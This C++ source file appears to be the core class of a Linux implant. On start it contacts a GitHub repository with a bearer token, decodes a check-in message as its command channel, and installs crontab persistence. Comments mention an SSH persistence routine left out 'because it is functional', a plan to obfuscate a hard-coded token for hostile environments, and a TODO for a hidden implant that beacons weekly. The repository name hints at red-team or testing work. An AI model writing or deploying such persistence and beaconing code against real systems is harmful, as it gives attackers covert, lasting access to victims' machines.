// the application core class

#define CPPHTTPLIB_OPENSSL_SUPPORT

#include "grab_read_access_token.h"
#include "core.h"
#include <sstream>
#include <iostream>
#include <string>
#include "cpp-httplib/httplib.h"
#include <nlohmann/json.hpp>
#include <base64.hpp>
#include "clean-encoding.h"
#include <vector>
#include "ssh_persistence.h"
#include "crontab_persistence.h"

Core::Core() {
    std::cout << "[+] Application core initialized" << '\n';
    try {
        contact_server();
        establish_persistence();                                     // after this call, file_system_locations will be populated with the locations the file has been copied to;
    } catch (const std::exception & e) {
        std::cout << "[!] Core::Core raised a standard exception" << e.what() << '\n';
    } catch (...) {
        std::cout << "[!] Core::Core raised an unknown error" << '\n';
    }
}

                                            // The TLS encryption of this request has been confirmed with Wireshark
                                            // consult for further changes: https://github.com/yhirose/cpp-httplib
void Core::contact_server() {
    try {

        std::string auth_token = grab_read_access_token();          // returns "FAILED_NO_TOKEN" upon failure;
                                                                    // PAT.txt won't exist in a hostile environment, so hard code the access token with constexpr compile time obfuscation

        std::ostringstream header_formatted_token_string;           // creating the formatted bearer token needed for the request
        header_formatted_token_string << "token ";
        header_formatted_token_string << auth_token;

        // string that works: token {access_token}
        httplib::Headers headers = {
            { "User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0" },
            { "Authorization", header_formatted_token_string.str() }
        };

        httplib::Client client("https://api.github.com");

        client.enable_server_certificate_verification(true);

        std::cout << "[+] About to make the request" << '\n';

        auto response = client.Get("/repos/Carnelian-Security/authentication-testing/contents/test.txt", headers);

        std::cout << "[+] The request has been made" << '\n';

        if (response && response->status == 200) {
            std::cout << "[+] HTTP status code: " << response->status << '\n';

            nlohmann::json_abi_v3_11_3::json parsed_string = nlohmann::json::parse(response->body);

            std::string encoded_string = parsed_string["content"];

            std::string decoded_string = base64::from_base64(base64_remove_newlines(encoded_string));

            //std::cout << "[+] Decoded string: " << base64::from_base64(base64_remove_newlines(encoded_string)) << '\n';         // it is imperative to clean newlines before decoding!
            std::cout << "[+] Decoded string: " << decoded_string;         // it is imperative to clean newlines before decoding!

            std::string test_string = "contact has been established.";

            decoded_string.pop_back();

            if (decoded_string == test_string) {
                std::cout << "[+] Contact has successfully been established." << '\n';
            } else {
                std::cout << "[!] There is a difference between the 2 messages." << '\n';
                exit(EXIT_FAILURE);
            }

        } else if (response && response->status != 200) {
            std::cout << "[!] Request went through but the response code is not 200" << '\n';
        } else {
            std::cerr << "[!] The request failed: " << response.error() << '\n';
        }
    }
    catch (const std::exception & e) {
        std::cerr << "[!] A Standard exception occurred: " << e.what() << '\n';
    } catch (...) {
        std::cout << "[!] An unknown error occurred and was caught by (...)";
    }
}

void Core::establish_persistence() {
    std::cout << "[+] establish_persistence() routine initialized." << '\n' << "[+] Attempting to establish SSH and Cron based persistence" << '\n';

    /*
     * TODO: attempt to establish both SSH and Cron based persistence; then create a hidden orphan implant and start it (this should reach out once every 7 days)
     * */ 

    // if (establish_ssh_persistence() == true) {established_persistence_count++;}                       // true if persistence is established, false otherwise
    //      ^^^^^ this is commented out because it is functional; the code should be reviewed again before use

    if (establish_crontab_persistence() == true) {established_persistence_count++;}

}
